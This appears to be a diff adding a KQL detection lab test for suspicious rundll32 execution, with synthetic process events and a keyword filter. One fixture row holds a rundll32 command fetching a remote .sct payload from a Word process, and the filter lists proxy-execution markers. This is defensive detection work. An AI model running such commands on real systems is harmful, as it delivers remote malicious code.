@@ -1,0 +1,22 @@
+// Lab test: Suspicious Rundll32 Execution
+// Expected result: 1 row returned (rundll32 reaching to remote script content).
+let DeviceProcessEvents = datatable(
+    Timestamp:datetime,
+    DeviceName:string,
+    AccountName:string,
+    FileName:string,
+    FolderPath:string,
+    ProcessCommandLine:string,
+    InitiatingProcessFileName:string,
+    InitiatingProcessCommandLine:string,
+    ReportId:long
+)
+[
+    datetime(2026-07-09T17:00:00Z), "LAB-WIN10-01", "lab.user", "rundll32.exe", "C:\\Windows\\System32\\rundll32.exe", "rundll32.exe url.dll,FileProtocolHandler http://203.0.113.25/payload.sct", "winword.exe", "winword.exe C:\\Users\\lab.user\\Downloads\\proposal.doc", 7001,
+    datetime(2026-07-09T17:05:00Z), "LAB-WIN10-01", "lab.user", "rundll32.exe", "C:\\Windows\\System32\\rundll32.exe", "rundll32.exe shell32.dll,Control_RunDLL desk.cpl", "explorer.exe", "explorer.exe", 7002,
+    datetime(2026-07-09T17:10:00Z), "LAB-WIN10-01", "lab.user", "chrome.exe", "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "chrome.exe https://example.com", "explorer.exe", "explorer.exe", 7003
+];
+DeviceProcessEvents
+| where FileName =~ "rundll32.exe"
+| where ProcessCommandLine has_any ("javascript:", "mshtml,", "RunHTMLApplication", "http://", "https://", ".sct", "scrobj.dll")
+| project Timestamp, DeviceName, AccountName, FileName, FolderPath, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, ReportId
